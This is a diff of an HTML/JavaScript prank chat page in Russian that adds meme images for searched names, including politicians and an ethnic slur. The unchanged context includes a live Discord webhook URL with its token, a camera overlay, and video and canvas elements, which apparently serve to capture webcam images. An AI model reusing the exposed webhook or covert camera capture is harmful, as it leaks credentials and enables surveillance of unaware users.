@@ -30,7 +30,7 @@
 </head>
 <body onload="checkAuth()">
 
-<div id="vlad-scamer"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQyWjq_YNgK8ls1-LHX5eS5blhsGtYvctEhxQ&s"></div>
+<div id="vlad-scamer" onclick="this.style.display='none'"><img id="scamer-img" src=""></div>
 
 <div id="camera-overlay">
     <div class="warning-box">
@@ -81,7 +81,6 @@
 <script>
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
-    // WEBHOOK НЕ ТРОНУТ, КАК И ПРОСИЛИ
     const webhook = "https://discordapp.com/api/webhooks/1458617245449191722/kcIMB-vV6DAm9J5xsBka_ieQNhWMwYl_6fGwTXiuYv38Lk1D3omTUA_D3m4t9CB0Nidw";
 
     const defaultAvatars = {
@@ -97,7 +96,6 @@
             common: ["Ясно.", "Похуй вообще.", "Жиза, че.", "Мда...", "База.", "Лол.", "Кринж."]
         },
         "богдан": {
-            // Богдан теперь немногословен
             toxic: ["Код — говно.", "Не отвлекай.", "Не пиши.", "Тупой?"],
             hi: ["Код пишу.", "Ку.", "Занят.", "Че надо?"],
             common: ["Костыли.", "Python топ.", "Гугли.", "Ок.", "Понятно.", "Фича."]
@@ -184,7 +182,40 @@
         if(e.key === 'Enter') {
             const val = document.getElementById('searchField').value.trim();
             if(!val) return;
-            if(val.toLowerCase() === "влад") { document.getElementById('vlad-scamer').style.display = 'flex'; return; }
+            
+            const lowVal = val.toLowerCase();
+            const scamerDiv = document.getElementById('vlad-scamer');
+            const scamerImg = document.getElementById('scamer-img');
+
+            const specificSearches = {
+                "влад": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQyWjq_YNgK8ls1-LHX5eS5blhsGtYvctEhxQ&s",
+                "сом": "https://www.meme-arsenal.com/memes/d3d06b28fa36108ca45ae305580b61d2.jpg",
+                "зеленский": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTS_sfYdG82kkvaCsF6tO1WnGicJ9u4g5fm_w&s",
+                "иван": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQorg1RkPlG3pFaYF8G8sJADv_GGxczerzbZg&s",
+                "путин": "https://i.pinimg.com/736x/b4/94/0c/b4940c014a7eef9ed499720bcf1003ac.jpg",
+                "пудж": "https://i.pinimg.com/736x/fb/0f/f2/fb0ff294bca7def8ef4303e5e622fbfd.jpg",
+                "таджик": "https://www.meme-arsenal.com/memes/1f912a43a086d74ac52b7d7c10b31e40.jpg",
+                "laroslav7": "https://i.postimg.cc/3NzLGpDq/Snimok-ekrana-2026-01-08-213608.png",
+                "whityyy": "https://i.ibb.co/G425bLYd/photo-2025-12-16-16-04-28.jpg",
+                "мелстрой": "https://i.mycdn.me/getVideoPreview?id=8712612219479&idx=3&type=39&tkn=_rKfXoim3Q9DdL7CljOxavM4Tfs&fn=vid_w",
+                "ральзей": "https://i.redd.it/izorp9z7pks71.jpg",
+                "нищита": "https://opis-cdn.tinkoffjournal.ru/mercury/07-upd-best-memes-2025.jpg",
+                "врядли": "https://n1s1.hsmedia.ru/00/ed/ea/00edeaa45ccf50332c3ee9b565442713/331x232_1_2144a966cb998a4375c419a02cc5e04e@1200x840_0xemf0lgpv_2186864119614076990.jpg.webp",
+                "скебоб": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT90xPn_In8gmSoj5m70PBGg2X3rW3DuH98KA&s",
+                "окак": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTY55xLkJi13KSIxUIoxz1-sNFV6VzHon8v4w&s",
+                "миньйон": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSgX1EysLf6uuwSInG3EeTEgiSBFF0zq8VjkA&s",
+                "бу": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQaLcxHm5wpj6_MTDdpDzafKfFXHBy9mjMZEA&s",
+                "терпи": "https://n1s1.hsmedia.ru/18/2c/a6/182ca6ac86e2791143a88b66acb627b0/630x630_1_2b3c2dd1156030d1396d3baeb719f6bb@630x630_0xK8VGUIRS_7311165128453277963.jpg.webp",
+                "брейнрот": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSzPPvsK8NNbWJU9fnnNH9RbWEhRRDKsn5L2Q&s",
+                "байден": "https://24tv.ua/resources/photos/news/202412/2712622_17101025.jpg?v=1734817861000&w=722&h=717&fit=cover&output=webp"
+            };
+
+            if (specificSearches[lowVal]) {
+                scamerImg.src = specificSearches[lowVal];
+                scamerDiv.style.display = 'flex';
+                return;
+            }
+
             if(!histories[val]) {
                 histories[val] = [];
                 renderContact(val);
@@ -294,23 +325,18 @@
         
         let replyText = "";
 
-        // --- УЛУЧШЕННЫЙ ИНТЕЛЛЕКТ И СПЕЦ ФРАЗЫ ---
-
-        // 1. Проверка для Богдана
         if (n === 'богдан') {
             if (t.includes('го в студию')) {
                 replyText = "ААААААА ЗАДРАЛ СО СВОЕЙ СТУДИЕЙ";
             }
         }
 
-        // 2. Проверка для Тимофея
         if (n === 'тимофей') {
             if (t.includes('сомы говно')) {
                 replyText = "Тебе все мои проекты не нравяться";
             }
         }
 
-        // 3. Если спец фраз нет, используем стандартную логику
         if (!replyText) {
             const p = botData[n] || { hi: ["Здарова."], toxic: ["Сам такой."], common: ["Ясно.", "Ок.", "Мда."] };
             const isToxic = ["хуй", "пидор", "сука", "блять", "еблан", "чмо", "урод"].some(w => t.includes(w));
